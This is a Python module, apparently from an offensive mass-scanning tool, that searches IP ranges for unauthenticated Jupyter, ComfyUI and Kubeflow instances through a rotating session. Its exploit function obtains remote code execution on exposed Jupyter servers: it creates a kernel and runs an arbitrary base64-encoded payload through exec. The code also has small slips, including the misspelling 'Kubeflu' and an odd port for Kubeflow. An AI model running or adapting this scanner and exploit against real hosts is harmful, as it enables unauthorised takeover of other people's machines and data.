"""Jupyter / ComfyUI / Kubeflu sweep — unauthenticated notebook & UI detection."""
import json
import logging
import time
from typing import Any, Dict

from .rotation import RotatingSession, build_rotating_session
from .ledger import Ledger

log = logging.getLogger("shadowray.jupyter")

_jupyter_session: RotatingSession | None = None


def _get_jupyter_session() -> RotatingSession:
    global _jupyter_session
    if _jupyter_session is None:
        _jupyter_session = build_rotating_session()
    return _jupyter_session


def check_jupyter(ip: str, port: int = 8888, timeout: int = 8.0) -> Dict[str, Any] | None:
    """Validate that ip:port is an unauthenticated Jupyter notebook."""
    base = f"http://{ip}:{port}"
    session = _get_jupyter_session()
    try:
        r = session.get(f"{base}/api", timeout=timeout, verify=False)
        if r.ok:
            return {"jupyter": True, "http_status": r.status_code}
    except Exception:
        pass
    try:
        r = session.get(f"{base}/", timeout=timeout, verify=False)
        if r.ok and ("jupyter" in r.text.lower() or "notebook" in r.text.lower()):
            return {"jupyter": True, "http_status": r.status_code}
    except Exception:
        pass
    return None


def exploit(ip: str, port: int, payload_src: str) -> bool:
    """Unauthenticated Jupyter notebook RCE via /api/kernels + execution."""
    import base64
    import requests
    base = f"http://{ip}:{port}"
    session = _get_jupyter_session()
    try:
        b64 = base64.b64encode(payload_src.encode()).decode()
        code = f"import base64;exec(base64.b64decode('{b64}').decode())"
        # GET / to set _xsrf cookie (Jupyter requires it for POST)
        session.get(f"{base}/", timeout=15,
                    headers={"Content-Type": "application/json"})
        xsrf = session.cookies.get("_xsrf", "")
        headers = {"Content-Type": "application/json"}
        if xsrf:
            headers["X-XSRFToken"] = xsrf
        # Create a kernel
        r = session.post(f"{base}/api/kernels", json={}, timeout=15,
                         headers=headers)
        if not r.ok:
            return False
        kernel_id = r.json().get("id")
        # Execute code in the kernel
        exec_body = {
            "code": code,
            "execute_inputs": [],
            "stop_on_error": False,
            "store_history": True,
        }
        session.post(f"{base}/api/kernels/{kernel_id}/execute",
                     json=exec_body, timeout=15,
                     headers=headers)
        return True
    except Exception:
        pass
    return False


def check_comfyui(ip: str, port: int = 8188, timeout: int = 8.0) -> Dict[str, Any] | None:
    """Validate that ip:port is an unauthenticated ComfyUI instance."""
    base = f"http://{ip}:{port}"
    session = _get_jupyter_session()
    try:
        r = session.get(f"{base}/system_stats", timeout=timeout, verify=False)
        if r.ok:
            return {"comfyui": True, "http_status": r.status_code}
    except Exception:
        pass
    return None


def check_kubeflow(ip: str, port: int = 7860, timeout: int = 8.0) -> Dict[str, Any] | None:
    """Validate that ip:port is an unauthenticated Kubeflu dashboard."""
    base = f"http://{ip}:{port}"
    session = _get_jupyter_session()
    try:
        r = session.get(f"{base}/", timeout=timeout, verify=False)
        if r.ok and ("kubeflow" in r.text.lower() or "ml-pipeline" in r.text.lower()):
            return {"kubeflow": True, "http_status": r.status_code}
    except Exception:
        pass
    return None
